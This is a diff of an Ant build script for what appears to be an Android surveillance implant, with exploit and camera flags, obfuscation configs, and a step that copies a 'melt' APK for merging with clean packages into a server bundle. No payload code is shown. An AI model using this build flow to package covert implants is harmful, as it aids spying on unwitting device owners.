@@ -145,7 +145,7 @@
 					<antcall target="libsnoexp" />
 					<var name="isdebug" value="true" />
 					<var name="isexploit" value="false" />
-					<var name="iscamera" value="true" />
+					<var name="iscamera" value="false" />
 					<copy file="preprocess/config.debug.bin" toFile="assets/c.bin" overwrite="true" />
 					<copy file="preprocess/resources.patched.bin" toFile="assets/r.bin" overwrite="true" />
 					<copy file="preprocess/dexguard-project.release.txt" toFile="dexguard-project.txt" overwrite="true" />
@@ -155,7 +155,7 @@
 					<antcall target="libsnoexp" />
 					<var name="isdebug" value="false" />
 					<var name="isexploit" value="false" />
-					<var name="iscamera" value="true" />
+					<var name="iscamera" value="false" />
 					<copy file="preprocess/config.release.bin" toFile="assets/c.bin" overwrite="true" />
 					<copy file="preprocess/resources.unpatched.bin" toFile="assets/r.bin" overwrite="true" />
 					<copy file="preprocess/dexguard-project.release.txt" toFile="dexguard-project.txt" overwrite="true" />
@@ -175,7 +175,7 @@
 					<antcall target="libsexp" />
 					<var name="isdebug" value="false" />
 					<var name="isexploit" value="true" />
-					<var name="iscamera" value="true" />
+					<var name="iscamera" value="false" />
 					<copy file="preprocess/config.release.bin" toFile="assets/c.bin" overwrite="true" />
 					<copy file="preprocess/resources.unpatched.bin" toFile="assets/r.bin" overwrite="true" />
 					<copy file="preprocess/dexguard-project.release.txt" toFile="dexguard-project.txt" overwrite="true" />
@@ -403,7 +403,7 @@
 		<antcall target="release" inheritAll="false" />
 		<var name="filename" value="bin/android_networking-release.apk" />
 		<mkdir dir="output/merge/" />
-		<copy file="${filename}" toFile="output/merge/core.android.release.apk" overwrite="true" />		
+		<copy file="${filename}" toFile="output/merge/core.android.melt.apk" overwrite="true" />		
 		<copy file="methodStartService.txt" toFile="output/merge/methodStartService.txt" overwrite="true" />
 		<echo>..\..\merge.rb C:\HT\Reversing\Android\CleanPackages\</echo>
 	</target>
@@ -422,10 +422,12 @@
 				<filter token="VERSION" value="${version}" />
 			</filterset>
 		</copy>
-
+				
 		<copy toDir="server/core" overwrite="true">
 			<fileset dir="output/release/" />
 		</copy>
+		
+		<copy file="output/merge/core.android.melt.apk" toDir="server/core" overwrite="true" />
 
 		<zip destfile="server/android_${version}.zip" basedir="server/core" />
 	</target>
